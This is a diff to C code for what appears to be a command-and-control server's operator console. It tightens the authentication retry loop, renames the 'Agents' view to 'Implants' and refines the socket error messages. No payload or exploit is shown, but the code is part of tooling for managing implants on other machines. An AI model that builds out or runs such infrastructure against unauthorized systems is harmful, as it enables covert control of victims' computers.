@@ -79,8 +79,10 @@ void *operator_handler(void *new_sock) {
     do {
         if (autheticate(sock) == 0) {
             goto START;
-        }
+        } 
+        try++;
     } while (try <= 3);
+    return NULL;
     // operator requesting infomartion or add new tasks
     START:
     while (1) {
@@ -103,8 +105,8 @@ void *operator_handler(void *new_sock) {
             cJSON_Delete(requested_info);
             return NULL;
         }
-        if (strcmp(about->valuestring, "Agents") == 0){
-            char *agents = info_view("Agents");
+        if (strcmp(about->valuestring, "Implants") == 0){
+            char *agents = info_view("Implants");
             send(sock, agents, strlen(agents), 0);
             free(agents);
         } else if (strcmp(about->valuestring, "Tasks") == 0) {
@@ -150,7 +152,7 @@ void *Operator_conn(void* port) {
 
     serverSock = socket(AF_INET, SOCK_STREAM, 0);
     if (serverSock == -1) {
-        perror("Socket creation failed");
+        perror("Socket creation failed for operator console");
         sleep(60);
         return NULL;
     }
@@ -161,14 +163,14 @@ void *Operator_conn(void* port) {
     serverAddr.sin_family = AF_INET;
 
     if (bind(serverSock, (struct sockaddr*)&serverAddr, sizeof(serverAddr))) {
-        perror("binding failed");
+        perror("binding failed For operator console\n");
         close(serverSock);
         sleep(60);
         return NULL;
     }
 
     if (listen(serverSock, SOMAXCONN) == -1) {
-        perror("Listen Failed");
+        perror("Listen Failed for operator console\n");
         close(serverSock);
         sleep(60);
         return NULL;
